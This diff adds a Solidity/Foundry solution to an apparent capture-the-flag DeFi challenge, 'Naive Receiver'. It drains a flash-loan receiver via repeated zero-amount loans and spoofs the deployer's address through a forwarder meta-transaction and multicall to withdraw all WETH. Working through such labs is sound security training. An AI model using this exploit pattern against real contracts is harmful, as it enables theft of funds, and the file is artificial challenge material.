@@ -77,7 +77,31 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
-        //Start here
+        //Set up draining the receiver and pool contracts.
+        bytes[] memory data = new bytes[](11);
+        for(uint256 i; i < 10; i++){
+            //onFlashLoan doesn't check the address that called it. 
+            data[i] = abi.encodeWithSignature("flashLoan(address,address,uint256,bytes)", address(receiver), address(weth), 0, "");
+        }
+
+        //Use withdraw from the NaiveReceiverPool contract to transfer all the WETH to recovery address
+        data[10] = abi.encodePacked(abi.encodeCall(NaiveReceiverPool.withdraw, (WETH_IN_RECEIVER + WETH_IN_POOL, payable(recovery))), bytes32(uint256(uint160(deployer))));
+        BasicForwarder.Request memory request = BasicForwarder.Request({
+            from: player,
+            target: address(pool),
+            value: 0,
+            gas: gasleft(),
+            nonce: 0,
+            data: abi.encodeCall(Multicall.multicall, (data)),
+            deadline: block.timestamp
+        });
+
+        //Use forwarder contract to make meta-transaction
+        bytes32 hash = keccak256(abi.encodePacked("\x19\x01", forwarder.domainSeparator(), forwarder.getDataHash(request)));
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, hash);
+        bytes memory signature = abi.encodePacked(r, s, v);
+        //Instead of having more than 2 transactions, use multicall to bundle into one.
+        forwarder.execute(request, signature);
     }
 
     /**
